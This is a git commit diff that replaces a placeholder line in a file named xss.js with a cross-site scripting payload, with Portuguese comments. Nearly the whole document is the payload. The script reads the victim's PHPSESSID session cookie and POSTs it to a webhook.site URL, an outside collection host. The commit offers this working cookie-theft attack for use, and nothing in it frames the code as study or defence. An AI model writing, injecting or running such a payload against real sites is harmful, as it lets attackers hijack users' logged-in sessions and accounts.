9c31d4928d6440ded6d00c484254abafba53600d
Douglas Rodrigues <39203535+DouglasRao@users.noreply.github.com>
2023-06-24 03:05:38 -0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,19 @@
-Teste
+<script>
+    // Obter o valor do cookie
+    var cookieValue = document.cookie
+        .split('; ')
+        .find(row => row.startsWith('PHPSESSID='))
+        .split('=')[1];
+    
+    // Definir o URL do webhook
+    var webhookUrl = 'https://webhook.site/2dfcc623-5c60-4ed9-84c7-f2efae2af582';
+
+    // Enviar o valor do cookie para o webhook
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ cookie: cookieValue }),
+    });
+</script>
